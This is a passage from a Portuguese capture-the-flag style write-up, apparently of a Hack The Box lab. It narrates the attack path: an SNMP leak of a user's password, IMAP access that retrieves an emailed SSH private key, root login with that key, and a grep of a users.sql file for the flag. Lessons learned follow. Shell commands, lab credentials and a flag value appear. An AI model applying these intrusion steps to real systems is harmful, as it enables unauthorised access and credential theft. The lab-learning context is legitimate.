-----END OPENSSH PRIVATE KEY-----
)
1 OK Fetch completed (0.001 + 0.000 secs).
```
Primeiro acessei o imaps com o user tom e sua senha e encontrei o inbox Important , busquei todos os emails mas não tinha nada nessa pasta important , nisso voltei pro inbox e fiz search nele , achei um email e dei fetch, recuperei uma chave privada que vou tentar para o tom ou admin(podendo existir um user admin com essa chave ou pode ser do root).

---

Essa chave privada basicamente era uma pegadinha para rabbit hole em dois sentidos , ela funciona para o user tom e com isso eu vasculhei tudo do tom , só que no home dele tinha os diretórios de email que a gente já tinha acesso antes e vasculhamos para encontrar somente esse email a cima com uma chave privada . Mas como eu disse antes eu poderia testar ela pro root , porque da para raciocinar da seguinte forma , porque no email ele enviaria uma chave privada para o tom logar como tom sendo que o tom muito provavelmente tem sua chave privada em seu computador , faria mais sentido se fosse a chave privada de outra pessoa , nisso usei primeiro para user admin(pensei que poderia ser um user chamado admin por causa do remetente do email) mas não deu certo , então usei para root e consegui acesso , dei ls e encontrei um arquivo .sql chamado users , nisso dei cat e vi que era o que eu queria , dei grep para HTB e recuperei a senha .
```
ssh -i id_rsa admin@10.129.202.20
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
admin@10.129.202.20's password: 

                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/chave]
└─$ ssh -i id_rsa root@10.129.202.20
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 29 Aug 2026 02:30:08 PM UTC

  System load:  0.08              Processes:               177
  Usage of /:   66.4% of 5.70GB   Users logged in:         1
  Memory usage: 32%               IPv4 address for ens192: 10.129.202.20
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 29 14:22:43 2026 from 10.10.17.37
root@NIXHARD:~# ls
snap  users.sql
root@NIXHARD:~# cat users.sql 
create table users (
                id INT,
                        username VARCHAR(50),
                                password VARCHAR(50)
                        );
                        insert into users (id, username, password) values (1, 'ppavlata0', '6znAfvTbB2');
                        insert into users (id, username, password) values (2, 'ktofanini1', 'TP2NxFD62e');
                        insert into users (id, username, password) values (3, 'rallwell2', 't1t7WaqvEfv'); .... (Tem mais linhas mas são muitas)
                        
root@NIXHARD:~# cat users.sql | grep HTB
                        insert into users (id, username, password) values (150, 'HTB', 'cr3n4o7rzse7rzhnckhssncif7ds');
root@NIXHARD:~# 
```
## Considerações
Enumerei todos os serviços inicialmente TCP e vi que não foi possivel achar usuários padrão , login anônimo ou algo do tipo , não tem como fazer brute force em ssh devido a possivel fail2ban , não sabia nenhum nome de usuário de prévia e para o servidores de email também não , com isso não tendo porta 53 que é a de DNS eu não conseguiria também buscar nada sobre o alvo no sentido de tentar achar TXT , novos servidores DNS e A . Nisso pensei em buscar por serviços rodando em UDP , assim achei um open | filtered possivelmente rodando servidor dhcp , mas logo a baixo tinha o snmp que é um serviço muito importante que é utilizado para gerenciamento de dispositivos de rede , na qual dispositivos como roteadores , switchs e dispositivos IoT tem seus "logs" nesse servidor , nisso vemos um script sh rodando que tinha o intuito de alterar a senha do usuário tom (era o que parecia , visto que dava erro toda hora dizendo que não foi possível alterar a senha) e junto do user aparecia sua senha . A partir desse user e senha que começamos a poder explorar os serviços , nisso entrei no imaps e começei a pós exploração na qual exfiltrei dados de dentro do imaps que continham um valor de chave privada , e havia o ssh rodando na porta 22 . Com isso acessei o ssh com o tom e a chave privada e fiz a pós exploração que não deu em nada , nisso vi que fui enganado porque o tom deveria já ter sua chave guardada em seu host , nisso a chave era de outro usuário  , tentei logar como admin e a chave mas pediu senha , com isso loguei como root , vi que havia um arquivo chamado user.sql na home do root e fiz grep com o user que eu queria a senha e a recuperei.

Lições aprendidas
- Procurar sempre o que roda em cima do TCP e o que roda em cima do UDP , uma possivel vulnerabilidade pode estar onde você não espera e isso pode ajudar bastante.
- Vasculhar serviços de email , entender os resultados dos comandos que voce manda neles e extrair o máximo de lá.
- Usuários muitas vezes repetem senhas em vários serviços.
- Se achar uma chave privada sendo enviada para um usuário x , provavelmente ela não é do usuário x ;-; .








